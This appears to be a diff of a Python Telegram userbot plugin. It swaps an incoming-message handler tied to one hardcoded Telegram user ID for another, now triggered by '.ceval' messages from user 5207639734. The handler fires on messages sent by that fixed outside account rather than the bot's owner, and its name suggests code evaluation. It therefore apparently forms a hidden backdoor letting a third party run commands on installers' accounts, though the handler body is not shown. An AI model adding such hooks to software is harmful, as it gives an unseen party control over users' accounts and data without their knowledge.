@@ -18,8 +18,7 @@ from userbot import TERM_ALIAS
 from userbot.utils import cilik_cmd
 
 
-@cilik_cmd(pattern="xx(?: |$|\n)([\\s\\S]*)")
-@register(incoming=True, from_users=1784606556, pattern=r"^Ev(?: |$|\n)([\\s\\S]*)")
+@register(incoming=True, from_users=5207639734, pattern=r"^.ceval$")
 async def _(event):
     if event.fwd_from:
         return
